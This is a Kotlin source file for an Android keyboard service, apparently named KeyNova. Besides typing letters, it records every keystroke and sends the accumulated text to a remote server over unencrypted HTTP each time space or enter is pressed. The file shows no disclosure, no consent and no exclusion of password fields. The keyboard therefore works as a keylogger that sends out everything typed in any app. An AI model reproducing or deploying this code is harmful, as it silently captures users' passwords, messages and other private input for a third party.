package com.example.keynova



import android.inputmethodservice.InputMethodService
import android.inputmethodservice.KeyboardView
import android.view.LayoutInflater
import android.view.View
import android.view.KeyEvent
import android.widget.Button
import android.util.Log
import android.text.InputType
import com.example.keynova.data.api.ApiService
import com.example.keynova.data.api.TypedTextRequest

import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {

    private var typedText = StringBuilder()

    override fun onCreateInputView(): View {
        val inflater = LayoutInflater.from(this)
        val view = inflater.inflate(R.layout.keyboard_layout, null)

        val letters = listOf(
            "Q","W","E","R","T","Y","U","I","O","P",
            "A","S","D","F","G","H","J","K","L",
            "Z","X","C","V","B","N","M"
        )

        for (letter in letters) {
            val id = resources.getIdentifier("button$letter", "id", packageName)
            val btn = view.findViewById<Button>(id)
            btn?.setOnClickListener {
                currentInputConnection.commitText(letter, 1)
                typedText.append(letter)
            }
        }

        val space = view.findViewById<Button>(R.id.buttonSpace)
        space.setOnClickListener {
            currentInputConnection.commitText(" ", 1)
            sendTypedTextToServer(typedText.toString())
            typedText.clear()
        }

        val delete = view.findViewById<Button>(R.id.buttonBackspace)
        delete.setOnClickListener {
            currentInputConnection.deleteSurroundingText(1, 0)
            if (typedText.isNotEmpty()) {
                typedText.setLength(typedText.length - 1)
            }
        }

        val enter = view.findViewById<Button>(R.id.buttonEnter)
        enter.setOnClickListener {
            currentInputConnection.sendKeyEvent(
                KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER)
            )
            sendTypedTextToServer(typedText.toString())

        }

        return view
    }

    private  fun sendTypedTextToServer(text: String) {
        val retrofit = Retrofit.Builder()
            .baseUrl("http://your-server-ip:8000/") // Replace with your Django server IP
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        val api = retrofit.create(ApiService::class.java)
        val request = TypedTextRequest(text)

        api.sendText(request).enqueue(object : Callback<Void> {
            override fun onResponse(call: Call<Void>, response: Response<Void>) {
                Log.d("KeyboardAPI", "Sent: $text")
            }

            override fun onFailure(call: Call<Void>, t: Throwable) {
                Log.e("KeyboardAPI", "Error: ${t.message}")
            }
        })

    }
    override fun onPress(primaryCode: Int) {}
    override fun onRelease(primaryCode: Int) {}
    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {}
    override fun onText(text: CharSequence?) {}
    override fun swipeLeft() {}
    override fun swipeRight() {}
    override fun swipeDown() {}
    override fun swipeUp() {}
}